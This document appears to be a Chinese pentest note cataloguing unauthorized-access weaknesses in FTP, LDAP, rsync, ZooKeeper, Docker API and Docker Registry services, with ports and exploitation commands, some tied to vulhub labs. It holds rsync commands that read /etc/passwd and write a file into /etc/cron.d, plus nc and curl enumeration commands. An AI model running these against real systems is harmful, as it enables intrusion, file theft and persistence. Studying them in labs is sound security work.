## 简介

未授权访问，在不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。

## FTP 未授权访问

- 端口：21
- 介绍：FTP服务端配置anymouns 可登录，则可直接使用user为anymouns，不输入密码直接可登录到FTP
- 漏洞利用：直接访问ftp路径：ftp://ip:port/，或终端登录，输入user为anymouns

##  LDAP 未授权访问

- 端口：389
- 介绍：LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问
- 漏洞利用：[工具](https://ldapbrowserwindows.com/)连接

## rsync 未授权访问

- 端口：873
- 介绍：rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件
- 漏洞利用：https://vulhub.org/#/environments/rsync/common/
  - `rsync rsync://your-ip:873/src/ ` 列出目录
  - `rsync -av rsync://your-ip:873/src/etc/passwd ./`  下载文件
  - `rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell` 上传文件

##  ZooKeeper 未授权访问

- 端口：2181
- 介绍：ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。
- 漏洞利用：
  - `echo envi|nc xxx.xxx.xxx.xxx 2181` 获取服务器环境信息
  - `echo stat |nc 192.168.131.128 2181`

## Docker 未授权访问

- 端口：2375
- 介绍：Docker API可以执行Docker命令，在未授权的情况下可以执行docker命令
- 漏洞利用：https://vulhub.org/#/environments/docker/unauthorized-rce/

## Docker Registry 未授权访问

- 端口：5000
- 介绍：docker remote api可以执行docker命令
- 漏洞利用：
  - `curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog` 查询catalog
  - `curl -k -XGET https://xxx.xxx.xxx/v2/<image>/tags/list `查询tags



持续更新中



## 参考链接

https://blog.csdn.net/weixin_57567655/article/details/126493671